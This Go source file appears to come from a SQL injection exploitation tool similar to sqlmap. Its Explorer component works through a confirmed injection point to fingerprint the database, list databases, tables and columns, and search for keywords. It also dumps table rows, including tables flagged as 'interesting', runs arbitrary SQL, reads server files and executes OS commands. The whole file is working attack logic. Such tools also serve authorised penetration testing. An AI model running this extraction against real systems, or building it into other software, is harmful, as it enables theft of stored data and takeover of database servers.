package core

import (
	"fmt"
	"strings"
)

// Explorer drives enumeration and extraction through the confirmed session.
// It is deliberately database-agnostic: all SQL differences live in Dialect.
type Explorer struct {
	E *Engine
	X *Executor
	S *Session
}

func NewExplorer(e *Engine, s *Session) *Explorer {
	return &Explorer{E: e, X: NewExecutor(e, s), S: s}
}

func (x *Explorer) result(kind, details, payload string) Result {
	return Result{
		Parameter:  x.S.Point.Name,
		Type:       kind,
		Payload:    payload,
		DBMS:       x.S.DBMS,
		Details:    details,
		Confidence: 1.0,
		Location:   string(x.S.Point.Location),
		Technique:  x.S.Technique,
		Prefix:     x.S.Boundary.Prefix,
		Suffix:     x.S.Boundary.Suffix,
		Columns:    x.S.Columns,
	}
}

// Run executes every action requested through the CLI options.
func (x *Explorer) Run() []Result {
	var out []Result
	opts := x.E.Opts

	if opts.Fingerprint || opts.BannerGrab || opts.CurrentDB || opts.CurrentUser ||
		opts.Hostname || opts.Privileges || opts.IsDBA || opts.Banner {
		out = append(out, x.fingerprint()...)
	}

	if opts.SQLQuery != "" {
		if value, err := x.X.Scalar(opts.SQLQuery); err == nil {
			out = append(out, x.result("sql-query", opts.SQLQuery, value))
		} else {
			x.E.logWarn(fmt.Sprintf("SQL query failed: %v", err))
		}
	}

	if opts.FileRead != "" {
		if expr, ok := x.X.Dialect.FileRead(opts.FileRead); ok {
			if value, err := x.X.Scalar(expr); err == nil {
				out = append(out, x.result("file-read", opts.FileRead, value))
			} else {
				x.E.logWarn(fmt.Sprintf("file read failed: %v", err))
			}
		} else {
			x.E.logWarn(fmt.Sprintf("file read is not supported for %s", x.S.DBMS))
		}
	}

	if opts.FileExec != "" {
		if expr, ok := x.X.Dialect.OSCmd(opts.FileExec); ok {
			if value, err := x.X.Scalar(expr); err == nil {
				out = append(out, x.result("os-cmd", opts.FileExec, value))
			} else {
				x.E.logWarn(fmt.Sprintf("OS command failed: %v", err))
			}
		} else {
			x.E.logWarn(fmt.Sprintf("OS command execution is not supported for %s", x.S.DBMS))
		}
	}

	if opts.ListDBs || opts.DumpAll || opts.Schema {
		out = append(out, x.listDatabases()...)
	}

	if opts.Search != "" {
		out = append(out, x.search(opts.Search)...)
	}

	if opts.ListTables || opts.DumpAll || opts.DumpTable != "" || opts.Schema || opts.Table != "" {
		out = append(out, x.listTables()...)
	}

	if opts.ListColumns || opts.DumpAll || opts.DumpTable != "" || opts.ColumnsCSV != "" || opts.Schema {
		out = append(out, x.listColumns()...)
	}

	if opts.CountRows {
		out = append(out, x.countRows()...)
	}

	if opts.DumpAll {
		out = append(out, x.dumpAll()...)
	} else if opts.DumpTable != "" || opts.Table != "" {
		table := opts.DumpTable
		if table == "" {
			table = opts.Table
		}
		db := opts.Database
		if db == "" {
			db = x.currentDatabase()
		}
		out = append(out, x.dumpTable(db, table)...)
	}

	return out
}

func (x *Explorer) fingerprint() []Result {
	var out []Result
	items := []struct {
		kind  string
		expr  string
		label string
	}{
		{"banner", x.X.Dialect.Version(), "DBMS version"},
		{"current-db", x.X.Dialect.CurrentDB(), "current database"},
		{"current-user", x.X.Dialect.User(), "current user"},
		{"hostname", x.X.Dialect.Hostname(), "hostname"},
		{"is-dba", x.X.Dialect.IsDBA(), "is DBA"},
		{"privileges", x.X.Dialect.Privileges(), "privileges"},
	}
	for _, item := range items {
		value, err := x.X.Scalar(item.expr)
		if err != nil || value == "" {
			continue
		}
		out = append(out, x.result(item.kind, item.label, value))
		x.E.logSuccess(fmt.Sprintf("%s: %s", item.label, value))
	}
	return out
}

func (x *Explorer) listDatabases() []Result {
	values, err := x.X.Strings(x.X.Dialect.Databases())
	if err != nil {
		x.E.logWarn(fmt.Sprintf("could not list databases: %v", err))
		return nil
	}
	x.E.Log.ListDBHeader()
	for _, db := range values {
		x.E.Log.ListDB(db)
	}
	x.E.Log.Blank()
	return []Result{x.result("list-dbs", "available databases", strings.Join(values, ","))}
}

func (x *Explorer) databasesToScan() []string {
	if x.E.Opts.Database != "" {
		return []string{x.E.Opts.Database}
	}
	values, err := x.X.Strings(x.X.Dialect.Databases())
	if err != nil {
		return nil
	}
	var out []string
	for _, db := range values {
		if isSystemDB(db) && x.E.Opts.RiskLevel < 3 {
			continue
		}
		out = append(out, db)
	}
	return out
}

func (x *Explorer) listTables() []Result {
	var out []Result
	for _, db := range x.databasesToScan() {
		values, err := x.X.Strings(x.X.Dialect.Tables(db))
		if err != nil || len(values) == 0 {
			continue
		}
		x.E.Log.SectionHeader(fmt.Sprintf("TABLES (%s)", db))
		for _, t := range values {
			x.E.Log.SectionItem(t)
		}
		x.E.Log.Blank()
		res := x.result("list-tables", db, strings.Join(values, ","))
		out = append(out, res)
	}
	return out
}

func (x *Explorer) listColumns() []Result {
	var out []Result
	db := x.E.Opts.Database
	table := x.E.Opts.Table
	if db == "" {
		db = x.currentDatabase()
	}
	if table == "" {
		tables, err := x.X.Strings(x.X.Dialect.Tables(db))
		if err != nil {
			return nil
		}
		for _, t := range tables {
			out = append(out, x.columnsFor(db, t)...)
		}
		return out
	}
	return x.columnsFor(db, table)
}

func (x *Explorer) columnsFor(db, table string) []Result {
	values, err := x.X.Strings(x.X.Dialect.Columns(db, table))
	if err != nil || len(values) == 0 {
		return nil
	}
	x.E.Log.SectionHeader(fmt.Sprintf("COLUMNS (%s.%s)", db, table))
	for _, c := range values {
		x.E.Log.SectionItem(c)
	}
	x.E.Log.Blank()
	return []Result{x.result("list-columns", fmt.Sprintf("%s.%s", db, table), strings.Join(values, ","))}
}

func (x *Explorer) countRows() []Result {
	var out []Result
	db := x.E.Opts.Database
	table := x.E.Opts.Table
	if db == "" {
		db = x.currentDatabase()
	}
	tables := []string{}
	if table != "" {
		tables = []string{table}
	} else {
		values, err := x.X.Strings(x.X.Dialect.Tables(db))
		if err != nil {
			return nil
		}
		tables = values
	}
	for _, t := range tables {
		value, err := x.X.Scalar(x.X.Dialect.RowCount(db, t))
		if err != nil {
			continue
		}
		out = append(out, x.result("count-rows", fmt.Sprintf("%s.%s", db, t), value))
	}
	return out
}

func (x *Explorer) dumpTable(db, table string) []Result {
	cols, err := x.X.Strings(x.X.Dialect.Columns(db, table))
	if err != nil || len(cols) == 0 {
		x.E.logWarn(fmt.Sprintf("could not list columns for %s.%s", db, table))
		return nil
	}
	limit := x.E.Opts.Rows
	if limit <= 0 {
		limit = x.E.Opts.Limit
	}
	if limit <= 0 {
		limit = 50
	}
	offset := x.E.Opts.Offset
	var rows [][]string
	for i := 0; i < limit; i++ {
		expr := x.X.Dialect.DumpRow(db, table, cols, offset+i)
		value, err := x.X.Scalar(expr)
		if err != nil || value == "" {
			break
		}
		parts := strings.Split(value, "\x1f")
		if len(parts) == 1 && parts[0] == "" {
			break
		}
		rows = append(rows, parts)
	}
	if len(rows) == 0 {
		x.E.logWarn(fmt.Sprintf("no rows extracted from %s.%s", db, table))
		return nil
	}
	x.E.Log.SectionHeader(fmt.Sprintf("DATA (%s.%s)", db, table))
	for _, row := range rows {
		x.E.Log.SectionData(strings.Join(row, " | "))
	}
	x.E.Log.Blank()
	x.E.logSuccess(fmt.Sprintf("%d row(s) from %s.%s", len(rows), db, table))

	res := x.result("dump-table", fmt.Sprintf("%s.%s", db, table), fmt.Sprintf("%d rows", len(rows)))
	res.ColumnNames = cols
	res.Rows = rows
	return []Result{res}
}

func (x *Explorer) dumpAll() []Result {
	var out []Result
	for _, db := range x.databasesToScan() {
		tables, err := x.X.Strings(x.X.Dialect.Tables(db))
		if err != nil {
			continue
		}
		for _, table := range tables {
			if !isInterestingTable(table) && x.E.Opts.RiskLevel < 3 {
				continue
			}
			out = append(out, x.dumpTable(db, table)...)
		}
	}
	return out
}

func (x *Explorer) search(keyword string) []Result {
	var out []Result
	tables, err := x.X.Strings(x.X.Dialect.SearchTables(keyword))
	if err == nil && len(tables) > 0 {
		out = append(out, x.result("search-tables", keyword, strings.Join(tables, ",")))
		x.E.Log.SectionHeader(fmt.Sprintf("TABLES MATCHING '%s'", keyword))
		for _, t := range tables {
			x.E.Log.SectionItem(t)
		}
		x.E.Log.Blank()
	}
	columns, err := x.X.Strings(x.X.Dialect.SearchColumns(keyword))
	if err == nil && len(columns) > 0 {
		out = append(out, x.result("search-columns", keyword, strings.Join(columns, ",")))
		x.E.Log.SectionHeader(fmt.Sprintf("COLUMNS MATCHING '%s'", keyword))
		for _, c := range columns {
			x.E.Log.SectionItem(c)
		}
		x.E.Log.Blank()
	}
	return out
}

func (x *Explorer) currentDatabase() string {
	value, err := x.X.Scalar(x.X.Dialect.CurrentDB())
	if err != nil || value == "" {
		return ""
	}
	return value
}
